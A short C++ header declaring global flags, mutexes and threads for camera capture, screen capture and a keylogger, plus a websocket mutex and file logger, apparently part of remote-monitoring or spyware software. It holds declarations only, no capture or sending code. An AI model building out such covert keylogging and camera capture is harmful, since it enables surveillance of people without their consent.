#pragma once
#include <atomic>
#include <mutex>
#include <spdlog/spdlog.h>
#include <spdlog/sinks/basic_file_sink.h>

extern std::atomic<bool> g_camera_active;
extern std::atomic<bool> g_camera_should_stop;
extern std::atomic<bool> g_screen;
extern std::atomic<bool> g_keylogger; 
extern std::mutex ws_mutex;

extern std::mutex g_control_mutex;

extern std::thread camera_thread;
extern std::thread screen_thread;
extern std::thread keylogger_thread; 

extern std::shared_ptr<spdlog::logger> file_logger;
